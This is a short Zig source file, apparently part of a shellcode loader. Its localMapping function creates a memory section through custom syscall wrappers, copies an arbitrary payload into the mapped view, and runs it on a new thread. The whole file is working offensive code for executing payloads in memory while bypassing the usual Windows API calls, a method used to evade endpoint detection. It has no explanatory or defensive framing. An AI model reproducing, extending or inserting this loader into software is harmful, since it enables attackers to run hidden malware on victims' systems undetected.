const std = @import("std");
const windows = std.os.windows;
const config = @import("config");
const Syscalls = @import("../syscall.zig").Syscalls;
const mem = @import("../helper/mem.zig");
const win32 = @import("../win32.zig");

pub fn localMapping(syscalls: Syscalls, payload: []const u8) !void {
    // Create section
    var max_size: windows.LARGE_INTEGER = @intCast(payload.len);
    const h_section = try mem.ntCreateSection(syscalls, &max_size);
    defer _ = mem.ntClose(syscalls, h_section);

    // Map section
    var view_size: windows.SIZE_T = @intCast(payload.len);
    const map_addr = try mem.ntMapSection(syscalls, h_section, null, &view_size);
    // defer _ = mem.ntUnmapSection(syscalls, null, map_addr);

    // Copy payload to mapped memory
    @memcpy(@as([*]u8, @ptrCast(map_addr)), payload[0..payload.len]);

    // Create remote thread
    const h_thread = try mem.ntCreateRemoteThread(syscalls, null, map_addr);
    defer _ = mem.ntClose(syscalls, h_thread);

    mem.ntWait(syscalls, h_thread);
}